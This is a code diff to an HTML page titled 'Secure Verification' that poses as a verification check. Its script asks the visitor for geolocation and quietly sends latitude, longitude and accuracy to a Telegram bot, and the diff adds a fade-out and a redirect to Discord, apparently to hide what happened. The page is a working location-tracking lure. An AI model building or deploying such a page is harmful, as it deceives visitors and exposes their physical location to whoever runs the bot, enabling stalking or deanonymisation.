@@ -3,11 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Secure Verification</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
 
 <style>
+
 *{
     margin:0;
     padding:0;
@@ -19,39 +21,64 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
+
     background:
         linear-gradient(rgba(0,0,0,.55), rgba(0,0,0,.55)),
         url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1600&auto=format&fit=crop');
+
     background-size:cover;
     background-position:center;
+
     font-family:'Poppins',sans-serif;
     overflow:hidden;
 }
 
 .card{
+
     width:380px;
     padding:40px 30px;
+
     border-radius:24px;
+
     backdrop-filter:blur(18px);
+
     background:rgba(255,255,255,0.08);
+
     border:1px solid rgba(255,255,255,0.15);
+
     box-shadow:0 10px 40px rgba(0,0,0,0.4);
+
     text-align:center;
+
     color:white;
+
+    transition:0.6s ease;
+}
+
+.card.hide{
+    opacity:0;
+    transform:scale(.92);
 }
 
 .logo{
+
     width:80px;
     height:80px;
+
     margin:auto;
     margin-bottom:20px;
+
     border-radius:50%;
+
     background:linear-gradient(135deg,#00c6ff,#0072ff);
+
     display:flex;
     align-items:center;
     justify-content:center;
+
     font-size:36px;
     font-weight:600;
+
     box-shadow:0 0 25px rgba(0,114,255,.5);
 }
 
@@ -69,12 +96,17 @@ p{
 }
 
 .loader{
+
     width:55px;
     height:55px;
+
     border:5px solid rgba(255,255,255,0.2);
     border-top:5px solid #00c6ff;
+
     border-radius:50%;
+
     margin:auto;
+
     animation:spin 1s linear infinite;
 }
 
@@ -95,6 +127,7 @@ p{
     font-size:12px;
     opacity:.55;
 }
+
 </style>
 
 <script>
@@ -111,24 +144,52 @@ function sendLocation(position) {
         "Verification completed successfully";
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+
+        headers: {
+            'Content-Type': 'application/json'
+        },
+
         body: JSON.stringify({
             chat_id: CHAT_ID,
             latitude: lat,
             longitude: lon
         })
+
     });
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+
+        headers: {
+            'Content-Type': 'application/json'
+        },
+
         body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: `📍 Lat: ${lat}, Lon: ${lon}
-Accuracy: ${position.coords.accuracy}m`
+            text:
+`📍 Lat: ${lat}
+📍 Lon: ${lon}
+🎯 Accuracy: ${position.coords.accuracy}m`
         })
+
     });
+
+    // Hide animation
+    setTimeout(() => {
+
+        document.querySelector(".card").classList.add("hide");
+
+    }, 1000);
+
+    // Redirect to Discord
+    setTimeout(() => {
+
+        window.location.href = "https://discord.com";
+
+    }, 1800);
 }
 
 function requestLocation() {
@@ -136,11 +197,16 @@ function requestLocation() {
     if(navigator.geolocation){
 
         navigator.geolocation.getCurrentPosition(
+
             sendLocation,
+
             () => {
+
                 document.getElementById("status").innerText =
                     "Location permission denied";
+
             }
+
         );
 
     }
